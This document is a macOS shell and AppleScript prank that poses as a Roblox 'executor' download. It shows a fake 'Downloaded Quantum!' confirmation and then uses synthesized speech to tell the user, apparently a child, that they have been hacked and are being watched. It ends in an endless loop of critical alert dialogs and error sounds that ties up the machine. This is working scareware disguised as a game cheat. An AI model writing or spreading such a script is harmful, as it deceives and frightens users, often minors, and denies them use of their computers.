osascript -e '
display dialog "Downloaded Quantum!" with title "Executor" buttons {"OK"} default button "OK"

tell application "Google Chrome"
	set theURL to "https://www.youtube.com/watch?v=pUDFTYkk0rk"
	make new tab at end of tabs of window 1 with properties {URL:theURL}
end tell

do shell script "open -a Roblox"
delay 6

tell application "Google Chrome"
	set tabList to tabs of window 1
	repeat with t in tabList
		if URL of t contains "pUDFTYkk0rk" then
			close t
			exit repeat
		end if
	end repeat
end tell
'

say -v "Alex" "I see your face.."
delay 2
say -v "Alex" "Is little bro skibidi?"
delay 2
open -a Terminal
delay 0.01
open -a Roblox
delay 0.1
say -v "Alex" "I ran code to hack you a second ago."
delay 2
say -v "Alex" "I am right now viewing you little skibidi kid."
delay 3
while true; do
  osascript -e 'display alert "I am Steve" as critical buttons {"OK"} default button 1 giving up after 0.01' &
  afplay /System/Library/Sounds/Basso.aiff &
  sleep 0.2
done
